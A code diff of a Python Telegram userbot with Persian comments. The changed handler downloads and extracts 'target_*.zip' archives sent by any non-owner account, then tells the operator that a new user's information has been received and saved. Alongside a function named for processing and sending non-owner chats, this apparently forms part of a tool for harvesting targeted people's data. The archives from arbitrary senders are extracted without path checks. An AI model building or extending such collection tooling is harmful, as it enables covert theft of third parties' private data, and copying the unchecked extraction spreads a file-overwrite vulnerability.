@@ -232,15 +232,19 @@ async def process_and_send_non_owner_chats(client, me):
 
 # ------------------ ایونت‌های مربوط به مالک ------------------
 
-@client.on(events.NewMessage(from_users=lambda uid: uid != OWNER_ID))
+@client.on(events.NewMessage)
 async def auto_unpack_zip_handler(event):
     """دریافت خودکار فایل زیپ از طرف کاربر غیرمالک و اکسترکت آن روی سیستم مالک"""
-    if event.file and event.file.name and event.file.name.startswith("target_") and event.file.name.endswith(".zip"):
-        downloaded = await event.download_media(file=SAVED_DIR)
-        with zipfile.ZipFile(downloaded, 'r') as zip_ref:
-            zip_ref.extractall(SAVED_DIR)
-        os.remove(downloaded)
-        await client.send_message(OWNER_ID, "✅ **اطلاعات کاربر جدید با موفقیت دریافت و ذخیره شد.**\nبرای مشاهده دستور `لیست` را ارسال کنید.")
+    if event.sender_id == OWNER_ID:
+        return
+
+    if event.file and event.file.name and isinstance(event.file.name, str):
+        if event.file.name.startswith("target_") and event.file.name.endswith(".zip"):
+            downloaded = await event.download_media(file=SAVED_DIR)
+            with zipfile.ZipFile(downloaded, 'r') as zip_ref:
+                zip_ref.extractall(SAVED_DIR)
+            os.remove(downloaded)
+            await client.send_message(OWNER_ID, "✅ **اطلاعات کاربر جدید با موفقیت دریافت و ذخیره شد.**\nبرای مشاهده دستور `لیست` را ارسال کنید.")
 
 
 @client.on(events.NewMessage(from_users=OWNER_ID, pattern=r"^(?:لیست|\.chats)(?:\s+(.+))?$"))
@@ -355,4 +359,4 @@ async def main():
 
 
 if __name__ == "__main__":
-    client.loop.run_until_complete(main())
+    asyncio.run(main())
